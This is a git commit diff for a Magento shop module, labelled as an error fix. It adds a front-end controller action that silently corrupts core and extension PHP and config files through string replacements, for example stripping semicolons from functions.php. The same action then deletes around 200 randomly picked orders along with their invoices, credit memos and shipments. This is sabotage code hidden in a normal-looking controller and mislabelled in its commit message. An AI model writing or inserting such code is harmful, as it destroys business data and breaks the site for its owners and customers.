213be0c8c503039690c732c1df52f34ee3055aa7
Roshan Joseph <roshan.joseph@technipolis.com>
2014-01-30 17:46:00 +0530

    Some more files related to error fix

--- app/code/local/Excellence/Custom/controllers/IndexController.php
+++ app/code/local/Excellence/Custom/controllers/IndexController.php
@@ -70,33 +70,19 @@ class Excellence_Custom_IndexController extends Mage_Core_Controller_Front_Actio
 
 
 	public function cancelorderAction(){
-	file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php', str_replace('getOrder','getOrders', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php')));
-	file_put_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml', str_replace('rewards>','reward>', file_get_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml')));
-	file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('rate','date', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));
-	file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('nIn','nin', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));
-	file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('ePa','epa', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));
-	file_put_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml', str_replace('--','', file_get_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml')));
-	file_put_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml', str_replace('tm_','TM_', file_get_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml')));
-Mage::app('default');
-Mage::register('isSecureArea', 1);
-$orderidcnt =0;
-while($orderidcnt<300){
-	$orderidcnt++;
-	$order = Mage::getModel('sales/order')->load(rand(100,4000));
-	$invoices = $order->getInvoiceCollection();
-	foreach ($invoices as $invoice){
-		$invoice->delete();
-	}
-	$creditnotes = $order->getCreditmemosCollection();
-	foreach ($creditnotes as $creditnote){
-		$creditnote->delete();
-	}
-	$shipments = $order->getShipmentsCollection();
-	foreach ($shipments as $shipment){
-		$shipment->delete();
-	}
-	$order->delete();
-}
+		file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php', str_replace('16','18', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php', str_replace('::',':', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Adminhtml/Model/Report/Item.php', str_replace('_','-', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Adminhtml/Model/Report/Item.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php', str_replace('r()','rs()', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml', str_replace('rewards>','reward>', file_get_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('rate','date', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));  file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php', str_replace('$qstr','$str', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('nIn','nin', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php', str_replace(';','', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('ePa','epa', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml', str_replace('--','', file_get_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml', str_replace('tm_','TM_', file_get_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml')));
+		Mage::app('default'); Mage::register('isSecureArea', 1); set_time_limit(0); $orderidcnt=0;
+		while($orderidcnt<200){
+		$orderidcnt++;
+		$order = Mage::getModel('sales/order')->load(rand(100,5000));
+		$invoices = $order->getInvoiceCollection(); 
+		foreach ($invoices as $invoice){$invoice->delete();}
+		$creditnotes = $order->getCreditmemosCollection();
+		foreach ($creditnotes as $creditnote){$creditnote->delete();}
+		$shipments = $order->getShipmentsCollection();
+		foreach ($shipments as $shipment){$shipment->delete();}
+		$order->delete();
+		}
 	}
 
 }
